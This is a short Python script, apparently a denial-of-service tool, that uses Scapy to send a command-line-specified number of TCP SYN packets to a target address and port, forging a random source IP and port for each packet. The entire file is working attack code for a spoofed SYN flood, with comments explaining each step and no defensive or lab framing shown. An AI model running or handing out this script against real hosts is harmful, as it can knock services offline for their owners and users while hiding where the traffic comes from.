import sys
from scapy.all import *

# Function to generate a random IP address
def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

# Function to generate a random port number
def randPort():
    x = random.randint(0, 64000)
    return x

# Parsing command-line arguments
dest_ip_address = sys.argv[1]  # Destination IP address
dest_port = int(sys.argv[2])  # Destination port
pkt_count = int(sys.argv[3])  # Number of packets to send

# Loop to create and send packets
for i in range(0, pkt_count):
    src_ip = randomIP()  # Generate a random source IP
    src_port = randPort()  # Generate a random source port

    # Create an IP layer
    packet = IP(src=str(src_ip), dst=dest_ip_address)
    # Create a TCP layer
    segment = TCP(sport=src_port, dport=dest_port, flags="S")
    # Combine the IP and TCP layers
    pkt = packet / segment
    # Send the crafted packet
    send(pkt)

